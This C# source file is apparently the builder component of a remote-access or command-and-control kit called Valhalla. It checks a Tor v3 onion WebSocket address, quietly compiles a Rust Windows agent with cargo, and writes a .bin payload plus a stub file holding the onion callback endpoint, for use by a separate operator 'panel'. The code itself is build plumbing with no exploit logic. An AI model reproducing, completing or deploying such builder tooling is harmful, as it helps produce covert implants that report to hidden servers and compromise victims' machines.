using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace Valhalla
{
    internal sealed class AgentBuildResult
    {
        public string OutputPath { get; set; }
        public string StubPath { get; set; }
        public string RustProjectRoot { get; set; }
        public string BuildOutput { get; set; }
    }

    internal static class AgentBuildService
    {
        private static readonly Regex OnionEndpoint = new Regex(
            @"^ws://(?<host>[a-z2-7]{56})\.onion:(?<port>[1-9][0-9]{0,4})(?<path>/[^\s]*)?$",
            RegexOptions.IgnoreCase | RegexOptions.CultureInvariant);

        public static AgentBuildResult Build(string onionAddress, string outputPath)
        {
            string normalizedEndpoint = ValidateOnionAddress(onionAddress);
            string rustRoot = FindRustProjectRoot();
            string manifest = Path.Combine(rustRoot, "Cargo.toml");
            if (!File.Exists(manifest)) throw new FileNotFoundException("Rust agent Cargo.toml was not found.", manifest);

            string cargo = FindExecutable("cargo.exe", "cargo");
            string packageBin = Path.Combine(rustRoot, "target", "release", "valhalla_agent.exe");

            ProcessStartInfo start = new ProcessStartInfo
            {
                FileName = cargo,
                Arguments = "build --release --manifest-path " + Quote(manifest) + "",
                WorkingDirectory = rustRoot,
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                StandardOutputEncoding = Encoding.UTF8,
                StandardErrorEncoding = Encoding.UTF8
            };

            StringBuilder output = new StringBuilder();
            using (Process process = new Process { StartInfo = start })
            {
                process.OutputDataReceived += (sender, args) => { if (args.Data != null) output.AppendLine(args.Data); };
                process.ErrorDataReceived += (sender, args) => { if (args.Data != null) output.AppendLine(args.Data); };
                if (!process.Start()) throw new InvalidOperationException("Cargo could not be started.");
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();
                process.WaitForExit();
                if (process.ExitCode != 0)
                    throw new InvalidOperationException("Rust agent build failed (cargo exit code " + process.ExitCode + ").\r\n" + output.ToString().Trim());
            }

            if (!File.Exists(packageBin))
                throw new FileNotFoundException("Cargo completed but the Valhalla Agent executable was not produced.", packageBin);

            using (FileStream stream = File.OpenRead(packageBin))
            {
                if (stream.Length < 2 || stream.ReadByte() != 'M' || stream.ReadByte() != 'Z')
                    throw new InvalidDataException("The compiled Valhalla Agent is not a valid Windows PE executable.");
            }

            string finalOutput = Path.GetFullPath(outputPath);
            string outputDirectory = Path.GetDirectoryName(finalOutput);
            if (string.IsNullOrWhiteSpace(outputDirectory)) throw new InvalidOperationException("Output directory is invalid.");
            Directory.CreateDirectory(outputDirectory);
            if (!finalOutput.EndsWith(".bin", StringComparison.OrdinalIgnoreCase))
                finalOutput += ".bin";
            File.Copy(packageBin, finalOutput, true);

            string stubDirectory = Path.Combine(outputDirectory, "stub");
            string stubPath = Path.Combine(stubDirectory, "stub.bin");
            Directory.CreateDirectory(stubDirectory);
            string tempStub = stubPath + ".tmp";
            File.WriteAllText(tempStub, normalizedEndpoint + "\n", new UTF8Encoding(false));
            if (File.Exists(stubPath)) File.Replace(tempStub, stubPath, null);
            else File.Move(tempStub, stubPath);

            return new AgentBuildResult
            {
                OutputPath = finalOutput,
                StubPath = stubPath,
                RustProjectRoot = rustRoot,
                BuildOutput = output.ToString()
            };
        }

        public static string ValidateOnionAddress(string value)
        {
            string endpoint = (value ?? string.Empty).Trim();
            Match match = OnionEndpoint.Match(endpoint);
            if (!match.Success) throw new ArgumentException("Onion address must be a ws:// v3 onion endpoint such as ws://<56-character-onion-host>:443/valhalla.", nameof(value));
            int port = int.Parse(match.Groups["port"].Value, System.Globalization.CultureInfo.InvariantCulture);
            if (port < 1 || port > 65535) throw new ArgumentException("Onion endpoint port must be between 1 and 65535.", nameof(value));
            return endpoint;
        }

        private static string FindRustProjectRoot()
        {
            string configured = Environment.GetEnvironmentVariable("VALHALLA_AGENT_ROOT");
            if (!string.IsNullOrWhiteSpace(configured) && File.Exists(Path.Combine(configured, "Cargo.toml")))
                return Path.GetFullPath(configured);

            DirectoryInfo current = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
            for (int depth = 0; current != null && depth < 8; depth++, current = current.Parent)
            {
                string sibling = Path.Combine(current.FullName, "agent");
                if (File.Exists(Path.Combine(sibling, "Cargo.toml"))) return sibling;
                if (File.Exists(Path.Combine(current.FullName, "Cargo.toml")) && File.Exists(Path.Combine(current.FullName, "src", "main.rs"))) return current.FullName;
            }
            throw new DirectoryNotFoundException("Could not locate the Valhalla agent project. Set VALHALLA_AGENT_ROOT to the project root when the panel is deployed separately from its source tree.");
        }

        private static string FindExecutable(params string[] names)
        {
            foreach (string name in names)
            {
                try
                {
                    ProcessStartInfo probe = new ProcessStartInfo
                    {
                        FileName = name,
                        Arguments = "--version",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    };
                    using (Process process = Process.Start(probe))
                    {
                        if (process == null) continue;
                        process.WaitForExit(3000);
                        if (!process.HasExited) try { process.Kill(); } catch { }
                        if (process.ExitCode == 0) return name;
                    }
                }
                catch { }
            }
            throw new FileNotFoundException("Rust Cargo was not found. Install the Rust toolchain and ensure cargo is available on PATH.");
        }

        private static string Quote(string value)
        {
            if (value == null) throw new ArgumentNullException(nameof(value));
            return "\"" + value.Replace("\"", "\\\"") + "\"";
        }
    }
}
